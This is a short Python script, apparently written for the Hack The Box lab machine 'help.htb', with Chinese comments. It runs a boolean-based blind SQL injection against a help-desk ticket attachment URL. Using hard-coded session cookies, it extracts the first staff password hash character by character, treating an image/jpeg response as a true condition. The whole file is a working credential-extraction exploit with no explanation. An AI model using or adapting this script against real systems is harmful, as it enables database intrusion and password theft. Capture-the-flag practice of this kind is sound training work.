#python
import requests

#宣告url+需注入欄位
def sqlIject(quer):
        url=f"http://help.htb/support/?v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 {quer}"
        cookies= {'PHPSESSID':'c9b8hkf654l1otnrln9l59nhk3','usrhash':'0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BG218Y%2BcUATwLZXKElYgM9RjUh0uLluyl20E9x08nbitw%3D%3D'}
        reponst = requests.get(url,cookies=cookies)
        rContentye = reponst.headers["Content-Type"]
        if rContentye == "image/jpeg":
                return True
        else:
                return False

#進行亂數+SQL Inject語法
keyspace="abcdef0123456789"
for i in range(0,41):
        for c in keyspace:
                inject = f"and substr((select password from staff limit 0,1),{i},1) = '{c}'"
                #print (inject)
                if sqlIject(inject):
                        #print (f"success:{c}")
                        print (c,end='',flush=True)
